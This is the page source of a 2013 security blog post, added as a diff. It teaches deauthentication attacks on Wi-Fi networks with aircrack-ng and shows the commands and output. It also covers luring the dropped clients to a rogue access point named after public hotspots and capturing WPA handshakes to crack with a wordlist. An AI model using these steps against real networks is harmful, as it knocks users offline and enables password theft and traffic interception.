@@ -1,0 +1,217 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Deauthing Wireless Clients - cubalo</title>
+  <meta name="author" content="Matt">
+
+  
+  <meta name="description" content="Tweet Deauthing Wireless Clients This year at DEFCON, the Hak5 WiFi Pineapples sold out within the first day. I noticed quite a few people walking &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://cubalo.github.io/blog/2013/12/07/deauthing-wireless-clients/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="cubalo" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">cubalo</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">cubalo</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">Ramblings of an OFFSEC grunt</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/mchandx/">twitter</a>
+  </li>
+
+
+  <li class="link">
+    <a href="http://github.com/mchandx/">github</a>
+  </li>
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:cubalo.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/2013/12/07/deauthing-wireless-clients/" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/2013/12/07/deauthing-wireless-clients/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">Deauthing Wireless Clients</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-12-07T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+<p>This year at DEFCON, the <a href="http://mobile.slashdot.org/story/13/08/06/0042256/wi-fi-pineapple-hacking-device-sells-out-at-def-con">Hak5 WiFi Pineapples sold out within the first day</a>. I noticed quite a few people walking around with their Pineapples on in Vegas and I&#8217;m sure a few of them were having some luck, but they only work against people attempting to connect to a network, not those who are already connected. So what if we could force those people already connected to drop the connection and try to reconnect? That&#8217;s where a deauth attack is valuable. By deauthenticating the clients and forcing them to reconnect, we can do three things:</p>
+<ol>
+<li>Denial of service.</li>
+<li>Redirect to our rogue access point (Pineapple, PwnPlug, SILICA, etc.).</li>
+<li>Capture the WPA handshake and attempt to crack the  password.</li>
+</ol>
+<p>Actually doing a deauth attack is really simple. I have a cheap laptop with Kali running on it and an Alfa card setup and this works perfectly. The first thing to do is to set up an interface in monitoring mode using airmon.</p>
+<pre>airmon-ng start wlan1</pre>
+<p>This creates the mon0 interface that we&#8217;ll use throughout the rest of the attack.</p>
+<p>Next we need to grab some information about the target network. Do this with airodump</p>
+<pre>airodump-ng mon0</pre>
+<p>Grab the BSSID and channel number of the target network. Change your interface over to the channel of the target</p>
+<pre>iwconfig mon0 channel X</pre>
+<p>and we&#8217;ll be ready to start the attack.</p>
+<p>To begin deauthing clients, we&#8217;ll need to use aireplay. The syntax is:</p>
+<pre>aireplay-ng -0 0 -a 00:00:00:00:00:00 mon0</pre>
+<ul>
+<li>-0 specifies a deauth attack</li>
+<li>-a is the BSSID of the target</li>
+<li>mon0 is your monitoring interface</li>
+</ul>
+<p>When you run this, it will send out deauthentication packets to the network, knocking off clients until you stop it.</p>
+<pre>root@kali:~# aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX mon0
+11:37:23  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel X
+NB: this attack is more effective when targeting
+a connected wireless client (-c &lt;client's mac&gt;).
+12:37:23  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:23  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:24  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:24  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:25  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:25  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:26  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:26  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]</pre>
+<p>Now the challenge is redirecting those deauthenticated clients to your access point. To do this, have your Pineapple with you and running, or set up another device with the SSID of the target network (assuming you can get your signal stronger than the existing access point) or to the SSID of a common network such as:</p>
+<ul>
+<li>linksys</li>
+<li>guest</li>
+<li>NETGEAR</li>
+<li>cisco</li>
+<li>attwifi (Starbucks)</li>
+<li>hhonors (Hilton Hotel)</li>
+</ul>
+<p>Another option is to capture the WPA/2 handshake with the client reconnects. You can use this to attack the password of the AP in order to get a foothold in the network. To do this, in another terminal have this command typed and ready to go:</p>
+<pre>airodump-ng mon0 --bssid XX:XX:XX:XX:XX:XX --channel X --write WPAhandshake</pre>
+<p>As soon as you stop sending deauth packets, run that command and wait for the top to have the &#8220;WPA handshake: XX:XX:XX:XX:XX:XX&#8221; value. From there, run aircrack with your wordlist of choice to attemp to crack the password.</p>
+<pre>aircrack-ng WPAhandshake.cap -w /usr/share/wordlists/fern-wifi/common.txt</pre>
+<p>Finally, a different way of using this attack is to create a jammer. Note that <a href="http://transition.fcc.gov/eb/jammerenforcement/jamfaq.pdf">any kind of jammer in the United States is absolutely illegal</a>, so don&#8217;t do this. I stumbled across <a href="https://code.google.com/p/wifijammer/">this</a> project which essentially does the same thing as aireplay, but against all APs running on a given channel. I have not tested this so I can not verify that it actually works, however to concept is valid.</p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
